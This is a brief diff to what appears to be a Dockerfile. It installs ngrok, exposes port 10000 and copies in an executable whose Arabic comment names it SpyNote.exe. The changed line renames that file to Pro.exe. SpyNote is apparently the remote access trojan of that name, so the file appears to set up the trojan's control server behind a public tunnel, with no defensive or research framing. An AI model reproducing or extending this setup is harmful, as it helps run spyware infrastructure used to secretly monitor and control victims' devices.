@@ -24,7 +24,7 @@ RUN curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | gpg --dearmor -o /e
 WORKDIR /app
 
 # انسخ ملف SpyNote.exe (غيّر الاسم حسب ملفك)
-COPY SpyNote.exe /app/app.exe
+COPY Pro.exe /app/app.exe
 
 EXPOSE 10000
 
